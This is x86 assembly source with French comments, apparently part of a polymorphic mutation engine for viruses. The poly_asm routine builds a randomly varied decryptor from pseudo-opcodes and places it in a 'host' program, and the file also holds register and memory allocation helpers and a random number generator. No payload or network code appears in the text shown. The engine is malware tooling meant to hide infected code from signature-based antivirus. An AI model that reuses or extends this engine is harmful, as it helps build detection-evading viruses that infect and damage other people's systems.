
;================================== VARIABLES ===================================
; (TRANSFORMATIONS UTILISATEURS PLUS BAS)

  NB_PASSES EQU 10
  poly_taille_decrypteur dd 0
  poly_rand_seed dd 45980131
  poly_memoire dd 0
  poly_va_memoire dd 0
  poly_va_buffer dd 0
  poly_va_code dd 0
  poly_mem_init db 0
  poly_ebp dd poly_pile_labels
  poly_passe db 0
  regs_utilises db 8 dup (?)

;============================ FONCTION D'ASSEMBLAGE poly_asm ====================
; C'est la seule (et unique) fonction du moteur que vous aurez à appeler. Elle
; est chargée d'assembler de manière polymorphique un pseudo-opcode. Pour 
; polymorphiser votre decrypteur, il vous faut l'apppeler avec les
; parametres suivant:
;   IN : edx = Taille maximum du code généré PAR OPCODE
;        esi --> pseudo-opcodes à polymorphiser, terminés par l'opcode FIN_DECRYPTEUR
;        edi --> endroit où stocker le code généré
;        ecx : Adresse où sera situé le code généré *au moment de son execution*, dans l'hote donc. 
;        eax --> buffer de taille NB_CASES_MEMOIRE*4 avec droit en ecriture *qui doit etre ecrit dans l'hote   
;        ebx = adresse (VA pas RVA) de ce buffer *dans l'hote*, vous devez la calculer a l'avance donc
;        la constante NB_CASES_MEMOIRE doit etre definie
;        NB: si vous n'utilisez pas l'instruction RNDMEM, eax et ebx peuvent etre nuls
;  OUT : eax = taille du code généré
;        edi --> juste après le code généré
;=================================================================================
poly_asm :
  mov [ebp+poly_memoire],eax
  mov [ebp+poly_va_memoire],ebx
  mov [ebp+poly_va_buffer],edi
  mov [ebp+poly_va_code],ecx
  mov [ebp+poly_passe], byte 0
poly_asm_init_mem:
  test eax,eax
  jz poly_asm_pas_de_mem
  cmp [ebp+poly_mem_init],byte 0
  jnz poly_asm_pas_de_mem  ; deja initialise, poly_asm appelé plusieurs fois
  inc byte [ebp+poly_mem_init]
  call init_memoire
poly_asm_pas_de_mem:
  mov ecx,NB_PASSES
poly_asm_repasse:
  pusha
  push dword [ebp+poly_rand_seed]
  call poly_asm_once  ; premiere passe pour calculer la taille du decrypteur
  pop dword  [ebp+poly_rand_seed]
  popa
  loop poly_asm_repasse
  call poly_asm_once
  ret

;======================= FONCTION d'EQUILIBRAGE =====================
; in:  eax=nb transfos restantes, edx=espace disponible en octets
; out: edx= nouvel espace disponible, eax=espace oté à edx et réservé 
;      pour les transfos suivantes
;
; Par defaut, cette regle aloue 1/nb_transfos_restantes à la transfo en cours.
; C'est a dire, elle effectue :
;        edx=(edx*nb_transfos_restantes)/(nb_transfos_restantes+1)
; Ceci permet de répartir équitablement dans une règle l'espace disponible.
;
; Cependant, cette strategie n'est pas toujours la bonne, notamment pour les
; règles fortement récursives. Dans ces cas là, une stratégie "je ne répartis rien"
; peut être préférable (au risque de voir une instruction de la regle consommer
; tout l'espace disponible au détriment des instructions suivantes) :
;
;optimise_taille_code_genere :
;    xor eax,eax
;    ret

optimise_taille_code_genere :		
   push edx
   mov ebx,eax
   inc ebx
   imul eax,edx
   xor edx,edx
   div ebx
   pop edx
   sub edx,eax
   ret


poly_asm_once :
  xor eax,eax
  pusha
;====== initialisations
  lea ecx,[ebp+poly_pile_labels]
  mov [ebp+poly_ebp],ecx
  lea edi,[ebp+utilisation_registres]
  mov ecx,8*2
  rep stosb
  mov [ebp+utilisation_registres+4],byte 1
  popa
  cmp [ebp+poly_memoire],eax
  jz poly_asm_loop
  call raz_modifs_memoire

;===== lecture du pseudo-code
poly_asm_loop:
  and [ebp+poly_taille_decrypteur],dword  0
  xor eax,eax
  push edi
  lea edi,[ebp+regs_utilises]
  stosd
  stosd
  pop edi
  lodsb
  test al,al
  jz poly_asm_fin
  movzx ecx,byte [esi]
  inc esi
  mov ebx,dword [ebp+jmp_table_opcodes+eax*4]
  push edx
  jecxz poly_asm_no_arg
poly_asm_arg_loop:
  xor eax,eax
  lodsb
  cmp al,TYPE_REGISTRE
  jnz poly_asm_pas_reg
  lodsd
  and eax,0111b
  inc byte [ebp+regs_utilises+eax]
  call reserve_registre
  jmp poly_asm_fin_loop
poly_asm_pas_reg:
  lodsd
poly_asm_fin_loop:
  push eax
  loop poly_asm_arg_loop
poly_asm_no_arg:
  call ebx
  mov eax,[esp] ;taille max par opcode
  sub eax,edx ;taille du code genere
  add [ebp+poly_taille_decrypteur],eax
  pop edx
  push esi
  lea esi,[ebp+regs_utilises]
  mov ecx,8
  xor eax,eax
  xor ebx,ebx
regs_reset:
  lodsb
  test al,al
  jz pas_mis
  mov eax,ebx
  call libere_registre
pas_mis:
  inc ebx
  loop regs_reset
  pop esi
  jmp poly_asm_loop
poly_asm_fin:
  mov eax,[ebp+poly_taille_decrypteur]
  inc byte [ebp+poly_passe]
  ret



;==================== RANDOM ======================

poly_rand_int :    ;in: eax=val max   out: eax=rand()
    push edx
    push ebx
    push eax
    mov eax,[ebp + poly_rand_seed]   ;on initialise eax avec la "graine"
    mov ebx,eax         ;on copie eax dans ebx c-a-d RAND_SEED
    shl eax,13          ;eax = (n << D2) = res1
    xor eax,ebx         ;eax = (res1 ^ n) = res2
    shr eax,19          ;eax = (res2 >> D3) = res3
    and ebx,4294967294  ;ebx = (n & E) = res4
    shl ebx,12          ;ebx = (res4 << D1) = res5
    xor eax,ebx         ;eax = (res5 ^ res3) = resultat final
    mov dword [ebp + poly_rand_seed],eax  ;on sauvegarde le resultat final
    xor edx,edx
    pop ebx
    div ebx
    mov eax,edx
    pop ebx
    pop edx
    or eax,eax
    ret             ;fini, vous trouvez le npa dans RANDOM_SEED


;===================== Gestion de la memoire =====================

utilisation_memoire db NB_CASES_MEMOIRE  dup (?);  utilisation de la mem
valeur_memoire dd NB_CASES_MEMOIRE dup (?);  valeur courante de la mem



init_memoire :
    pusha
    mov ecx,NB_CASES_MEMOIRE
    xor edx,edx
im_1:
    mov [ebp+utilisation_memoire+edx],byte 0
    dec eax
    call poly_rand_int
    mov ebx,eax
    lea eax,[edx*4]
    add eax,[ebp+poly_va_memoire]
    call set_memoire
    inc edx
    loop im_1
init_mem_fin:
    popa
    ret


choix_memoire :     ;out: eax=VA de la mémoire
    push edi
    push esi
    lea edi,[ebp+valeur_memoire]
    lea esi,[ebp+utilisation_memoire]
cm_1:
    mov eax,NB_CASES_MEMOIRE
    call poly_rand_int
    cmp [esi+eax],byte 0
    jnz cm_1
    shl eax,2
    add eax,[ebp+poly_va_memoire]
    call reserve_memoire
    pop esi
    pop edi
    ret

raz_modifs_memoire:
    pusha
    mov ecx,NB_CASES_MEMOIRE
    mov esi,[ebp+poly_va_memoire]
    lea edi,[ebp+valeur_memoire]
    rep movsd
    popa
    ret

contenu_memoire :	       ; in:   ebx=VA de la mémoire
    sub ebx,[ebp+poly_va_memoire]      ; out:  ebx=valeur de la case mémoire
    mov ebx,[ebp+valeur_memoire+ebx]
    ret


nb_memoire_libre :    	; out :  eax = nb cases de libre
    push esi
    push ecx
    push edx
    mov ecx,NB_CASES_MEMOIRE
    xor edx,edx
    xor eax,eax
    lea esi,[ebp+utilisation_memoire]
nml:
    lodsb
    xor al,1
    add edx,eax
    loop nml
    mov eax,edx
    pop edx
    pop ecx
    pop esi
    ret


lock_memoire:		
reserve_memoire :       ; in: eax=VA
    pusha
    lea esi,[ebp+utilisation_memoire]
    sub eax,[ebp+poly_va_memoire]
    shr eax,2
    mov [esi+eax],byte 1
    popa
    ret


set_memoire :		; in:	eax=VA de la case mémoire ebx=valeur
    push eax
    sub eax,[ebp+poly_va_memoire]
    add eax,[ebp+poly_memoire]
    mov [eax],dword ebx
    call change_memoire
    pop eax
    ret

	
change_memoire :		; in:	eax=VA de la case mémoire ebx=valeur
    push eax
    sub eax,[ebp+poly_va_memoire]
    mov [ebp+valeur_memoire+eax],ebx
    pop eax
    ret	


free_memoire:			
libere_memoire :	; in:	 eax=VA de la case memoire a liberer
    push eax
    sub eax,[ebp+poly_va_memoire]
    shr eax,2
    mov [ebp+utilisation_memoire+eax],byte 0
    pop eax
    ret


	
;===================== Gestion des registres =====================

	
utilisation_registres   db  0,0,0,0,0,0,0,0
utilisation_uregistres  db  0,0,0,0,0,0,0,0
choix_uregistres db 0,0,0,0,0,0,0,0

raz_choix_uregistres :
	pusha
	lea edi,[ebp+choix_uregistres]
	xor eax,eax
	stosd
	stosd
	mov [ebp+choix_uregistres+4],byte 2
	popa
	ret



est_registre_libre : 	; in : eax=registre out: carry=0 si registre libre
	and eax,0111b
	clc
	cmp word [ebp+utilisation_registres+eax],0
	jle erl_libre
	stc
erl_libre:	
	ret



lock_uregistre:	
lock_registre:	
reserve_registre :      ; in:	 eax=registre
	and eax,0111b
	inc byte [ebp+utilisation_registres+eax]
	inc byte [ebp+choix_uregistres+eax]
	ret


choix_uregistre :   	; out: eax = registre
	push ecx
	xor eax,eax
cu_1:	mov eax,8
	call poly_rand_int
	cmp byte [ebp+choix_uregistres+eax],0
	jz cu_fin
	jmp cu_1
cu_fin: 
        call reserve_uregistre
	pop ecx
	ret


reserve_uregistre :   ;in: eax=registre
	and eax,0111b
	cmp [ebp+utilisation_uregistres+eax],byte 0
	jnz rur_1
	cmp [ebp+utilisation_registres+eax],byte 0
	jnz rur_fin
	call reserve_registre
rur_1:
	inc byte [ebp+utilisation_uregistres+eax]
rur_fin:
	inc byte [ebp+choix_uregistres+eax]
	ret


libere_uregistre :    ;in: eax=registre
	and eax,0111b
	cmp [ebp+utilisation_uregistres+eax],byte 0
	jz lur_fin
	cmp [ebp+utilisation_uregistres+eax],byte 1
	jnz lur_1
	call libere_registre
lur_1:
	dec byte [ebp+utilisation_uregistres+eax]
lur_fin:
	ret 


free_registre:
free_uregistre:	
libere_registre :           ;in: eax=registre
    and eax,0111b
    dec byte [ebp+utilisation_registres+eax]
    ret


	
choix_registre :        ;out eax=registre libre ou indeterminé (il faut appeler nb_reg_libres avant)
cr_l:
    mov eax,8
    call poly_rand_int
    cmp byte [ebp+utilisation_registres+eax],0
    jg cr_l
    call reserve_registre
cr_fin:
    ret


nb_registres_libres :
	push ecx
	xor ecx,ecx
	xor eax,eax
nb_reg_loop:
	call est_registre_libre
	jc reg_pris
	inc ecx
reg_pris:
	inc eax
	cmp al,8
	jnz nb_reg_loop
	mov eax,ecx
	pop ecx
	ret



	 

	
 dd 20000 dup (?)
 poly_pile_labels:
